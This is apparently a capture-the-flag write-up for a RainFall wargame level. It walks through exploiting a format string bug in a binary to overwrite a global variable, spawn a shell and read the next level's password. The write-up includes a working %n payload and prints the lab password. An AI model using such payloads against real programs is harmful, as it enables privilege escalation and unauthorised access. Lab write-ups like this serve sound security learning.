# Level4

## Objective

The goal of Level 4 is to escalate from `level3` to `level4` by exploiting a format string vulnerability in the `level3` binary. By the end, you should be able to read the password for `level4`.

---

## Step 1: Examine the Binary

After switching to `level3`:

```bash
level4@RainFall:~$ ls
level3
```

Running the binary:

```bash
level3@RainFall:~$ ./level3
Hello
Hello
```

The program simply echoes back what we type, but suspiciously uses `printf()` directly with user input.

---

## Step 2: Investigate with `ltrace`

```bash
level3@RainFall:~$ ltrace ./level3
printf("test") = 4
```

We see that `printf()` is called **without a format string**, which means our input is treated as the format string itself.

---

## Step 3: Test with Format Specifiers

```bash
level3@RainFall:~$ ./level3
%p %p %p %p
0xbffff744 0xb7fd0ff4 0x80484b7 0x25207025
```

We can dump stack values using `%p`. This confirms a **format string vulnerability**.

---

## Step 4: So what's the expected input?

We want to overwrite a global variable called `m` that controls access to the target function. The program checks:

```c
if (m == 64) {
    system("/bin/sh");
}
```

Therefore, our goal is to use `%n` to write the value `64` into the memory address of `m`.

---

## Step 5: Find Address of `m`

In GDB:

```bash
(gdb) info variables
0x0804988c  m
```

So the variable `m` is located at `0x0804988c`.

---

## Step 6: Craft Exploit String

We inject the address of `m` into the input, followed by a format string to write `64` bytes before using `%n`:

```bash
python -c 'print "\x8c\x98\x04\x08" + "%60u" + "%4$n"' > /tmp/exploit
```

Explanation:

* `\x8c\x98\x04\x08` → address of `m` in little-endian.
* `%60u` → prints 60 characters.
* `%4$n` → writes the number of printed characters (60 + 4 = 64) into the 4th argument on the stack (our `m` address).

---

## Step 7: Run Exploit

```bash
level3@RainFall:~$ ./level3 < /tmp/exploit
whoami
level4
cat /home/user/level4/.pass
4c7e7b3068693b3c1a4d3ff39f0c9ca78eb2d2f63bdba4a1d2a8e1da7544f44e
```

We successfully overwrite `m` and trigger the hidden shell.

---

## Step 8: Summary

* **Vulnerability:** format string bug (`printf(user_input)`).
* **Offset:** writing with `%n` directly to the global variable `m`.
* **Target:** set `m = 64` to unlock `system("/bin/sh")`.
* **Outcome:** gained a shell as `level4` and retrieved the password.

> With this, you can `su level4` using the password.
